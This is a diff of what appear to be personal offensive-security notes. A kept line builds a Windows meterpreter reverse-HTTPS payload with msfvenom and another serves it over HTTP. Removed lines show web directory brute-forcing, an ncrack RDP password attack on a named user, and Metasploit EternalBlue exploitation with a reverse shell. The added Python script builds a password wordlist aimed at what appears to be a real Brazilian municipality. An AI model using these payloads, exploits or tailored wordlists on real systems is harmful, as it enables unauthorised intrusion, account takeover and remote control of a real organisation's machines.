@@ -6,22 +6,30 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/iis-urls.txt -t 50 -x aspx,asp,html,htm
+empresa_base = ["prefeitura", "atibaia", "prefeituraatibaia", "sum", "suma", "suma57667"]
+anos = ["2019", "2020", "2021"]
+sufixos = ["", "123", "1234", "@123", "!@#", "#", "@!", "@#"]
+combinacoes_fixas = [
+    "admin", "administrator", "senha", "senha123", "qwerty", "123456", "windows", "usuario"
+]
 
-gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x aspx,asp,html,htm
+with open("wordlist_atibaia.txt", "w") as f:
+    for base in empresa_base:
+        for ano in anos:
+            f.write(f"{base}{ano}\n")
+            f.write(f"{base}@{ano}\n")
+            for suf in sufixos:
+                f.write(f"{base}{ano}{suf}\n")
+                f.write(f"{base}@{ano}{suf}\n")
+        for suf in sufixos:
+            f.write(f"{base}{suf}\n")
 
+    for fixo in combinacoes_fixas:
+        f.write(f"{fixo}\n")
+        for ano in anos:
+            f.write(f"{fixo}{ano}\n")
+            for suf in sufixos:
+                f.write(f"{fixo}{ano}{suf}\n")
+                f.write(f"{fixo}@{ano}{suf}\n")
 
-nmap -p 80 --script=http-webdav-scan <ip>
-
-
-davtest -url http://<ip>
-
-
-ncrack -v -p 3389 -U <(echo rsilva) -P wordlist_pro.txt 192.168.1.84
-
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.100
-set LHOST 192.168.1.101
-exploit
-set PAYLOAD windows/meterpreter/reverse_tcp
-
+print("Wordlist personalizada criada como 'wordlist_atibaia.txt'")
